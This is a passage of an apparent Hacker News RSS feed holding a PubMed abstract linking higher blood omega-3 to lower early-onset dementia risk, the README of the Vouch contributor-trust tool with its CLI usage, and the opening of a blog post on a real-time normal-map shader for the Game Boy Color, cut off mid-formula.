<!-- "Filters applied" shows only when page is redirected from search -->
<!-- because search found one result -->

  

  

  

  



  


<header id="heading">
  
    
      
      <div id="short-view-heading">
        

        

<h2>
  
    
    
    
    
      
  Blood omega-3 is inversely related to risk of early-onset dementia


    
  
</h2>

        

        

<p><span>
    
      
        <span><span>Aleix Sala-Vila</span><span>&nbsp;et al.</span></span>
      
    
  </span>
  
    
      <span>
        Clin Nutr<span>.</span>
      </span>
      
        <span>
          <span>2026 Feb</span><span>.</span>
        </span>
      
    
  
</p>

        
        
        
      </div>
    
  
</header>

  



  

  



  <div id="abstract">
    
      <h2>
        Abstract
        
      </h2>
      
        
          
            <div id="eng-abstract">
              
                


  
    <p>
      
        <strong>
          Background &amp; aims:
        </strong>
      
      Early-onset dementia (EOD, defined as diagnosis &lt; age 65) imposes a high socio-economic burden. It is less prevalent and less investigated than late-onset dementia (LOD). Observational data indicate that many EOD cases are associated with potentially modifiable risk factors, yet the relationship between diet and EOD has been under-explored. Omega-3 fatty acids are promising dietary factors for dementia prevention; however, existing research has primarily focused on cohorts aged &gt;65. We examined the associations between omega-3 blood levels (which objectively reflect dietary intake) and incident EOD by leveraging data from the UK Biobank cohort.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Methods:
        </strong>
      
      We included participants aged 40-64, free of dementia at baseline and for whom plasma omega-3 levels and relevant covariates were available. We modeled the relationships between the three omega-3 exposures (total omega-3, DHA, and non-DHA omega-3) and incident EOD with quintiles (Q) and continuous linear relationships. We constructed Cox proportional hazards adjusting for sex, age at baseline and APOE-ε4 allele load, besides other lifestyle variables reported to relate to incident EOD. We also assessed the interaction between each exposure of interest and APOE-ε4 allele load.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Results:
        </strong>
      
      The study included 217,122 participants. During the mean follow-up of 8.3 years, 325 incident EOD cases were ascertained. Compared to participants at Q1 of total omega-3, those at Q4 and Q5 showed a statistically significantly lower risk of EOD (Q4, hazard ratio [95 % confidence interval] = 0.62 [0.43, 0.89]; Q5, 0.60 [0.42, 0.86]). A statistically significant inverse association was also observed for total omega-3 as a continuous variable. Compared to participants at Q1 of DHA, those at Q5 of non-DHA showed a significant lower risk of EOD. A statistically significant lower risk was observed in Q3, Q4 and Q5 of non-DHA omega-3. Finally, we observed no evidence of interaction omega-3 × APOE-ε4 allele load.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Conclusions:
        </strong>
      
      This study expands the evidence of a beneficial association of omega-3 and LOD to EOD as well. These findings suggest that an increased intake of omega-3 fatty acids earlier in life may slow the development of EOD. Additional research is needed to confirm our findings, particularly in more diverse populations.
    </p>
  

  


              
            </div>
          
        
      

      
    

    

    
      


  

  
    <p>
      
        <strong>
          Keywords:
        </strong>
      
      Alzheimer; Biomarkers; Cognition; Fatty acids; Lifestyle.
    </p>
  


    

  </div>


  
  


  <p id="copyright">
    Copyright © 2025 Elsevier Ltd and European Society for Clinical Nutrition and Metabolism. All rights reserved.
  </p>


  <p id="disclaimer">
  <a href="https://pubmed.ncbi.nlm.nih.gov/disclaimer/" target="_blank" data-ga-category="literature_resources" data-ga-action="disclaimer_link" data-ga-label="under_abstract">PubMed Disclaimer</a>
</p>
  
  <div id="conflict-of-interest">
    <h2>
      Conflict of interest statement
    </h2>

    <p xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:mml="http://www.w3.org/1998/Math/MathML" xmlns:p1="http://pubmed.gov/pub-one">Conflict of interest The authors declare the following personal relations and financial interests that may constitute possible competing interests: A.S.-V. has received research funding through his institution and support to attend professional meetings from the California Walnut Commission (Folsom, CA, US). W.S.H. holds stock in OmegaQuant Analytics, a laboratory that offers omega-3 testing for researchers, clinicians, and the public. Other authors report no conflict of interest.</p>
  </div>


  
  

  

  
  
  

  
  
    <div id="mesh-terms">
      <h2>
        MeSH terms
      </h2>

      <ul><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>
    </div>
  


  
  
    <div id="substances">
      <h2>
        Substances
      </h2>

      <ul><li></li><li></li></ul>
    </div>
  


  

  

  



  
  



  
  <div id="linkout">
    <h2>
      LinkOut - more resources
    </h2>

    <ul><li><h3>Full Text Sources</h3><ul><li><a href="https://www.clinicalkey.com/content/playBy/pii?v=S0261-5614(25)00338-3" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=8412&amp;uid=41506004&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=8309603" data-ga-category="link_out" data-ga-action="Full Text Sources" data-ga-label="ClinicalKey">
                    ClinicalKey
                  </a></li><li><a href="https://linkinghub.elsevier.com/retrieve/pii/S0261-5614(25)00338-3" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3048&amp;uid=41506004&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=8309603" data-ga-category="link_out" data-ga-action="Full Text Sources" data-ga-label="Elsevier Science">
                    Elsevier Science
                  </a></li></ul></li><li><h3>Medical</h3><ul><li><a href="https://medlineplus.gov/dementia.html" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3162&amp;uid=41506004&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=8309603" data-ga-category="link_out" data-ga-action="Medical" data-ga-label="MedlinePlus Health Information">
                    MedlinePlus Health Information
                  </a></li></ul></li><li><h3>Miscellaneous</h3><ul><li><a href="https://assays.cancer.gov/non-CPTAC-1087" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=8855&amp;uid=41506004&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=8309603" data-ga-category="link_out" data-ga-action="Miscellaneous" data-ga-label="NCI CPTAC Assay Portal">
                    NCI CPTAC Assay Portal
                  </a></li></ul></li></ul>
  </div>


</main>

    
  


    

    

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Vouch (181 pts)]]></title>
            <link>https://github.com/mitchellh/vouch</link>
            <guid>46935980</guid>
            <pubDate>Sun, 08 Feb 2026 16:45:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/mitchellh/vouch">https://github.com/mitchellh/vouch</a>, See on <a href="https://news.ycombinator.com/item?id=46935980">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Vouch</h2><a id="user-content-vouch" aria-label="Permalink: Vouch" href="#vouch"></a></p>
<p dir="auto">A project trust management system. People must be <strong>vouched for</strong> before
interacting with certain parts of a project (the exact parts are
configurable to the project to enforce). People can also be explicitly
<strong>denounced</strong> to block them from interacting with the project.</p>
<p dir="auto">The implementation is generic and can be used by any project on any code forge,
but we provide <strong>GitHub integration</strong> out of the box via GitHub actions
and the CLI.</p>
<p dir="auto">The vouch list is maintained in a single flat file using a minimal format
that can be trivially parsed using standard POSIX tools and any programming
language without external libraries.</p>
<p dir="auto"><strong>Vouch lists can also form a web of trust.</strong> You can configure Vouch to
read other project's lists of vouched or denounced users. This way,
projects with shared values can share their trust decisions with each other
and create a larger, more comprehensive web of trust across the ecosystem.
Users already proven to be trustworthy in one project can automatically
be assumed trustworthy in another project, and so on.</p>
<div dir="auto"><p dir="auto">Warning</p>
<p dir="auto">This is an experimental system in use by <a href="https://github.com/ghostty-org/ghostty">Ghostty</a>.
We'll continue to improve the system based on experience and feedback.</p>
</div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why?</h2><a id="user-content-why" aria-label="Permalink: Why?" href="#why"></a></p>
<p dir="auto">Open source has always worked on a system of <em>trust and verify</em>.</p>
<p dir="auto">Historically, the effort required to understand a codebase, implement
a change, and submit that change for review was high enough that it
naturally filtered out many low quality contributions from unqualified people.
For over 20 years of my life, this was enough for my projects as well
as enough for most others.</p>
<p dir="auto">Unfortunately, the landscape has changed particularly with the advent
of AI tools that allow people to trivially create plausible-looking but
extremely low-quality contributions with little to no true understanding.
Contributors can no longer be trusted based on the minimal barrier to entry
to simply submit a change.</p>
<p dir="auto">But, open source still works on trust! And every project has a definite
group of trusted individuals (maintainers) and a larger group of probably
trusted individuals (active members of the community in any form). So,
let's move to an explicit trust model where trusted individuals can vouch
for others, and those vouched individuals can then contribute.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Who is Vouched?</h2><a id="user-content-who-is-vouched" aria-label="Permalink: Who is Vouched?" href="#who-is-vouched"></a></p>
<p dir="auto"><strong>Who</strong> and <strong>how</strong> someone is vouched or denounced is left entirely up to the
project integrating the system. Additionally, <strong>what</strong> consequences
a vouched or denounced person has is also fully up to the project.
Implement a policy that works for your project and community.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">GitHub</h3><a id="user-content-github" aria-label="Permalink: GitHub" href="#github"></a></p>
<p dir="auto">Integrating vouch into a GitHub project is easy with the
<a href="https://github.com/mitchellh/vouch/tree/main/action">provided GitHub Actions</a>.
By choosing which actions to use, you can fully control how
users are vouched and what they can or can't do.</p>
<p dir="auto">For an example, look at this repository! It fully integrates vouch.</p>
<p dir="auto">Below is a list of the actions and a brief description of their function.
See the linked README in the action directory for full usage details.</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Action</th>
<th>Trigger</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://github.com/mitchellh/vouch/blob/main/action/check-pr/README.md">check-pr</a></td>
<td><code>pull_request_target</code></td>
<td>Check if a PR author is vouched on open or reopen. Bots and collaborators with write access are automatically allowed. Optionally auto-close PRs from unvouched or denounced users.</td>
</tr>
<tr>
<td><a href="https://github.com/mitchellh/vouch/blob/main/action/manage-by-discussion/README.md">manage-by-discussion</a></td>
<td><code>discussion_comment</code></td>
<td>Let collaborators vouch, denounce, or unvouch users via discussion comments. Updates the vouched file and commits the change.</td>
</tr>
<tr>
<td><a href="https://github.com/mitchellh/vouch/blob/main/action/manage-by-issue/README.md">manage-by-issue</a></td>
<td><code>issue_comment</code></td>
<td>Let collaborators vouch or denounce users via issue comments. Updates the vouched file and commits the change.</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">CLI</h3><a id="user-content-cli" aria-label="Permalink: CLI" href="#cli"></a></p>
<p dir="auto">The CLI is implemented as a Nushell module and only requires
Nushell to run. There are no other external dependencies.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Integrated Help</h4><a id="user-content-integrated-help" aria-label="Permalink: Integrated Help" href="#integrated-help"></a></p>
<p dir="auto">This is Nushell, so you can get help on any command:</p>
<div dir="auto" data-snippet-clipboard-copy-content="use vouch *
help add
help check
help denounce
help gh-check-pr
help gh-manage-by-issue"><pre>use vouch <span>*</span>
<span>help</span> add
<span>help</span> check
<span>help</span> denounce
<span>help</span> gh<span>-</span>check<span>-</span>pr
<span>help</span> gh<span>-</span>manage<span>-</span>by<span>-</span>issue</pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">Local Commands</h4><a id="user-content-local-commands" aria-label="Permalink: Local Commands" href="#local-commands"></a></p>
<p dir="auto"><strong>Check a user's vouch status:</strong></p>

<p dir="auto">Exit codes: 0 = vouched, 1 = denounced, 2 = unknown.</p>
<p dir="auto"><strong>Add a user to the vouched list:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Preview new file contents (default)
vouch add someuser

# Write the file in-place
vouch add someuser --write"><pre><span><span>#</span> Preview new file contents (default)</span>
vouch add someuser

<span><span>#</span> Write the file in-place</span>
vouch add someuser --write</pre></div>
<p dir="auto"><strong>Denounce a user:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Preview new file contents (default)
vouch denounce badactor

# With a reason
vouch denounce badactor --reason &quot;Submitted AI slop&quot;

# Write the file in-place
vouch denounce badactor --write"><pre><span><span>#</span> Preview new file contents (default)</span>
vouch denounce badactor

<span><span>#</span> With a reason</span>
vouch denounce badactor --reason <span><span>"</span>Submitted AI slop<span>"</span></span>

<span><span>#</span> Write the file in-place</span>
vouch denounce badactor --write</pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">GitHub Integration</h4><a id="user-content-github-integration" aria-label="Permalink: GitHub Integration" href="#github-integration"></a></p>
<p dir="auto">Requires the <code>GITHUB_TOKEN</code> environment variable. If not set and <code>gh</code>
is available, the token from <code>gh auth token</code> is used.</p>
<p dir="auto"><strong>Check if a PR author is vouched:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Check PR author status (dry run)
vouch gh-check-pr 123 --repo owner/repo

# Auto-close unvouched PRs (dry run)
vouch gh-check-pr 123 --repo owner/repo --auto-close

# Actually close unvouched PRs
vouch gh-check-pr 123 --repo owner/repo --auto-close --dry-run=false

# Allow unvouched users, only block denounced
vouch gh-check-pr 123 --repo owner/repo --require-vouch=false --auto-close"><pre><span><span>#</span> Check PR author status (dry run)</span>
vouch gh-check-pr 123 --repo owner/repo

<span><span>#</span> Auto-close unvouched PRs (dry run)</span>
vouch gh-check-pr 123 --repo owner/repo --auto-close

<span><span>#</span> Actually close unvouched PRs</span>
vouch gh-check-pr 123 --repo owner/repo --auto-close --dry-run=false

<span><span>#</span> Allow unvouched users, only block denounced</span>
vouch gh-check-pr 123 --repo owner/repo --require-vouch=false --auto-close</pre></div>
<p dir="auto">Outputs status: <code>skipped</code> (bot/collaborator), <code>vouched</code>, <code>allowed</code>, or <code>closed</code>.</p>
<p dir="auto"><strong>Manage contributor status via issue comments:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Dry run (default)
vouch gh-manage-by-issue 123 456789 --repo owner/repo

# Actually perform the action
vouch gh-manage-by-issue 123 456789 --repo owner/repo --dry-run=false"><pre><span><span>#</span> Dry run (default)</span>
vouch gh-manage-by-issue 123 456789 --repo owner/repo

<span><span>#</span> Actually perform the action</span>
vouch gh-manage-by-issue 123 456789 --repo owner/repo --dry-run=false</pre></div>
<p dir="auto">Responds to comments from collaborators with write access:</p>
<ul dir="auto">
<li><code>vouch</code> — vouches for the issue author</li>
<li><code>vouch @user</code> — vouches for a specific user</li>
<li><code>vouch &lt;reason&gt;</code> — vouches for the issue author with a reason</li>
<li><code>vouch @user &lt;reason&gt;</code> — vouches for a specific user with a reason</li>
<li><code>denounce</code> — denounces the issue author</li>
<li><code>denounce @user</code> — denounces a specific user</li>
<li><code>denounce &lt;reason&gt;</code> — denounces the issue author with a reason</li>
<li><code>denounce @user &lt;reason&gt;</code> — denounces a specific user with a reason</li>
</ul>
<p dir="auto">Keywords are customizable via <code>--vouch-keyword</code> and <code>--denounce-keyword</code>.</p>
<p dir="auto">Outputs status: <code>vouched</code>, <code>denounced</code>, or <code>unchanged</code>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Library</h3><a id="user-content-library" aria-label="Permalink: Library" href="#library"></a></p>
<p dir="auto">The module also exports a <code>lib</code> submodule for scripting:</p>
<div dir="auto" data-snippet-clipboard-copy-content="use vouch/lib.nu *

let records = open VOUCHED.td
$records | check-user &quot;mitchellh&quot; --default-platform github  # &quot;vouched&quot;, &quot;denounced&quot;, or &quot;unknown&quot;
$records | add-user &quot;newuser&quot;                                # returns updated table
$records | denounce-user &quot;badactor&quot; &quot;reason&quot;                 # returns updated table
$records | remove-user &quot;olduser&quot;                             # returns updated table"><pre>use vouch<span>/lib.nu *</span>
<span></span>
<span>let records = open VOUCHED.td</span>
<span>$records | check-user "mitchellh" --default-platform github  # "vouched", "denounced", or "unknown"</span>
<span>$records | add-user "newuser"                                # returns updated table</span>
<span>$records | denounce-user "badactor" "reason"                 # returns updated table</span>
<span>$records | remove-user "olduser"                             # returns updated table</span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Vouched File Format</h2><a id="user-content-vouched-file-format" aria-label="Permalink: Vouched File Format" href="#vouched-file-format"></a></p>
<p dir="auto">The vouch list is stored in a <code>.td</code> file. See
<a href="https://github.com/mitchellh/vouch/blob/main/VOUCHED.example.td">VOUCHED.example.td</a> for an example. The file is
looked up at <code>VOUCHED.td</code> or <code>.github/VOUCHED.td</code> by default.</p>
<div data-snippet-clipboard-copy-content="# Comments start with #
username
platform:username
-platform:denounced-user
-platform:denounced-user reason for denouncement"><pre><code># Comments start with #
username
platform:username
-platform:denounced-user
-platform:denounced-user reason for denouncement
</code></pre></div>
<ul dir="auto">
<li>One handle per line (without <code>@</code>), sorted alphabetically.</li>
<li>Optionally specify a platform prefix: <code>platform:username</code> (e.g., <code>github:mitchellh</code>).</li>
<li>Denounce a user by prefixing with <code>-</code>.</li>
<li>Optionally add details after a space following the handle.</li>
</ul>
<p dir="auto">The <code>from td</code> and <code>to td</code> commands are exported by the module, so
Nushell's <code>open</code> command works natively with <code>.td</code> files to decode
into structured tables and encode back to the file format with
comments and whitespace preserved.</p>
<div dir="auto"><p dir="auto">Note</p>
<p dir="auto"><strong>What is <code>.td</code>?</strong> This stands for "Trustdown," a play on the
word "Markdown." I intend to formalize a specification for trust
lists (with no opinion on how they're created or used) so that software
systems like this Vouch project and others can coordinate with each
other. I'm not ready to publish a specification until vouch itself
stabilizes usage more.</p>
</div>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I put a real-time 3D shader on the Game Boy Color (259 pts)]]></title>
            <link>https://blog.otterstack.com/posts/202512-gbshader/</link>
            <guid>46935791</guid>
            <pubDate>Sun, 08 Feb 2026 16:28:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.otterstack.com/posts/202512-gbshader/">https://blog.otterstack.com/posts/202512-gbshader/</a>, See on <a href="https://news.ycombinator.com/item?id=46935791">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><h2 id="demonstration">Demonstration</h2>
<p>I made a Game Boy Color game that renders images in real time. The player controls an orbiting light and spins an object.</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/SAQXEW3ePwo?si=YgqBeQYtj3VWzm8G" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
<h3 id="play-it-here">Play it here</h3>

<h3 id="check-out-the-code-download-the-roms">Check out the code, download the ROMs</h3>
<p><a href="https://github.com/nukep/gbshader" target="_blank" rel="noopener noreferrer nofollow">https://github.com/nukep/gbshader</a></p>
<h2 id="3d-workflow">3D Workflow</h2>
<h3 id="early-lookdev">Early lookdev</h3>
<p>Before really diving into this project, I experimented with the look in Blender to see if it would even look good. IMO it did, so I went ahead with it!</p>
<p>I experimented with a "pseudo-dither" on the Blender monkey by adding a small random vector to each normal.</p>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/teapot-optimizeddot.gif" alt="" loading="lazy"> <img src="https://blog.otterstack.com/posts/202512-gbshader/monkey.gif" alt="" loading="lazy"></p>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/lookdev-0824.png" alt="" loading="lazy" width="800" height="358"></p>
<h3 id="blender-to-normal-map-workflow">Blender to normal map workflow</h3>
<p>tl;dr: Cryptomattes and custom shaders to adjust normal maps</p>
<p>It doesn't really matter what software I used to produce the normal maps. Blender was the path of least resistance for me, so I chose that.</p>
<p>For the teapot, I simply put in a teapot, rotated a camera around it, and exported the normal AOV as a PNG sequence. Pretty straight-forward.</p>
<p>For the spinning Game Boy Color, I wanted to ensure that certain colors were solid, so I used cryptomattes in the compositor to identify specific geometry and output hard-coded values in the output.</p>
<p>The geometry in the screen was done by rendering a separate scene, then compositing it in the final render using a cryptomatte for the screen.</p>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/lookdev-0830.png" alt="" loading="lazy" width="800" height="392"></p>
<h2 id="the-math">The Math</h2>
<h3 id="normal-maps">Normal Maps</h3>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/gbspin_normal.gif" alt="" loading="lazy"> <img src="https://blog.otterstack.com/posts/202512-gbshader/teapot_normal.gif" alt="" loading="lazy"></p>
<p><em>The above animations are normal map frames that are used to solve the value of each pixel</em></p>
<p>Normal maps are a core concept of this project. They're already used everywhere in 3D graphics.</p>
<p><strong>And indeed, normal map images are secretly a vector field</strong>. The reason normal maps tend to have a blue-ish baseline color, is because everyone likes to associate XYZ with RGB, and +Z is the forward vector by convention.</p>
<p>In a typical 3D workflow, a normal map is used to encode the normal vector at any given point on a textured mesh.</p>

<p><em>Source: Own work (Danny Spencer). Suzanne model (c) Blender Foundation.</em></p>
<h3 id="calculating-a-lambert-shader-using-dot-products">Calculating a Lambert shader using dot products</h3>
<p>The simplest way to shade a 3D object is using the dot product:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mo>=</mo><mi mathvariant="bold">N</mi><mo>⋅</mo><mi mathvariant="bold">L</mi></mrow><annotation encoding="application/x-tex">v = \mathbf{N} \cdot \mathbf{L}</annotation></semantics></math></span></span></span></p>
<p>where <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span></span> is the normal vector, and <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></span></span> is the light position when it points towards the origin (or equivalently: the negative light direction).</p>
<p>Expanded out component-wise, this is:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mo>=</mo><msub><mi mathvariant="bold">N</mi><mi>x</mi></msub><msub><mi mathvariant="bold">L</mi><mi>x</mi></msub><mo>+</mo><msub><mi mathvariant="bold">N</mi><mi>y</mi></msub><msub><mi mathvariant="bold">L</mi><mi>y</mi></msub><mo>+</mo><msub><mi mathvariant="bold">N</mi><mi>z</mi></msub><msub><mi mathvariant="bold">L</mi><mi>z</mi></msub></mrow><annotation encoding="application/x-tex">v = \mathbf{N}_x\mathbf{L}_x + \mathbf{N}_y \mathbf{L}_y + \mathbf{N}_z\mathbf{L}_z</annotation></semantics></math></span></span></span></p>
<p>When the light vector is constant for all pixels, it models what most 3D graphics software calls a "distant light", or a "sun light".</p>
<h3 id="spherical-coordinates">Spherical Coordinates</h3>
<p>To speed up computation on the Game Boy, I use an alternate version of the dot product, using spherical coordinates.</p>
<p>A <strong>spherical coordinate</strong> is a point represented by a radius <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span></span></span>, a primary angle <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span></span></span> "theta", and a secondary angle <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi></mrow><annotation encoding="application/x-tex">\varphi</annotation></semantics></math></span></span></span> "phi". This is represented as a tuple: <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mi>θ</mi><mo separator="true">,</mo><mi>φ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(r, \theta, \varphi)</annotation></semantics></math></span></span></span></p>
<p>The dot product of two spherical coordinates:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>r</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>θ</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>φ</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><msub><mi>r</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>θ</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>φ</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>r</mi><mn>1</mn></msub><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>sin</mi><mo>⁡</mo><msub><mi>θ</mi><mn>1</mn></msub><mi>sin</mi><mo>⁡</mo><msub><mi>θ</mi><mn>2</mn></msub><mi>cos</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>φ</mi><mn>1</mn></msub><mo>−</mo><msub><mi>φ</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mi>cos</mi><mo>⁡</mo><msub><mi>θ</mi><mn>1</mn></msub><mi>cos</mi><mo>⁡</mo><msub><mi>θ</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(r_1, \theta_1, \varphi_1) \cdot (r_2, \theta_2, \varphi_2) = r_1r_2 (\sin \theta_1 \sin \theta_2 \cos(\varphi_1 - \varphi_2) + \cos \theta_1 \cos \theta_2)</annotation></semantics></math></span></span></span></p>
<p>Because all normal vectors are unit length, and the light vector is unit length, we can just assume the radius <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span></span></span> is equal to 1. This simplifies to:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mo>=</mo><mi>sin</mi><mo>⁡</mo><msub><mi>θ</mi><mn>1</mn></msub><mi>sin</mi><mo>⁡</mo><msub><mi>θ</mi><mn>2</mn></msub><mi>cos</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>φ</mi><mn>1</mn></msub><mo>−</mo><msub><mi>φ</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mi>cos</mi><mo>⁡</mo><msub><mi>θ</mi><mn>1</mn></msub><mi>cos</mi><mo>⁡</mo><msub><mi>θ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">v = \sin \theta_1 \sin \theta_2 \cos(\varphi_1 - \varphi_2) + \cos \theta_1 \cos \theta_2</annotation></semantics></math></span></span></span></p>
<p>And using the previous variable names, we get the formula:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mo>=</mo><mi>sin</mi><mo>⁡</mo><msub><mi>N</mi><mi>θ</mi></msub><mi>sin</mi><mo>⁡</mo><msub><mi>L</mi><mi>θ</mi></msub><mi>cos</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>N</mi><mi>φ</mi></msub><mo>−</mo><msub><mi>L</mi><mi>φ</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>cos</mi><mo>⁡</mo><msub><mi>N</mi><mi>θ</mi></msub><mi>cos</mi><mo>⁡</mo><msub><mi>L</mi><mi>θ</mi></msub></mrow><annotation encoding="application/x-tex">v = \sin N_\theta \sin L_\theta \cos(N_\varphi - L_\varphi) + \cos N_\theta \cos L_\theta</annotation></semantics></math></span></span></span></p>
<h2 id="making-it-work-on-the-game-boy">Making it work on the Game Boy</h2>
<h3 id="encoding-normal-maps-in-the-game-boy-rom">Encoding normal maps in the Game Boy ROM</h3>
<p>In the ROM, I decided to fix <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>θ</mi></msub></mrow><annotation encoding="application/x-tex">L_\theta</annotation></semantics></math></span></span></span> "L-theta" to a constant value for performance reasons. The player gets to control <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>φ</mi></msub></mrow><annotation encoding="application/x-tex">L_\varphi</annotation></semantics></math></span></span></span> "L-phi", creating an <strong>orbiting light</strong> effect.</p>
<p>This means that we can extract constant coefficients <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span></span></span> and <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span></span></span> and rewrite the formula:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>sin</mi><mo>⁡</mo><msub><mi>N</mi><mi>θ</mi></msub><mi>sin</mi><mo>⁡</mo><msub><mi>L</mi><mi>θ</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>cos</mi><mo>⁡</mo><msub><mi>N</mi><mi>θ</mi></msub><mi>cos</mi><mo>⁡</mo><msub><mi>L</mi><mi>θ</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>v</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>m</mi><mi>cos</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>N</mi><mi>φ</mi></msub><mo>−</mo><msub><mi>L</mi><mi>φ</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>b</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
m &amp;= \sin N_\theta \sin L_\theta \\
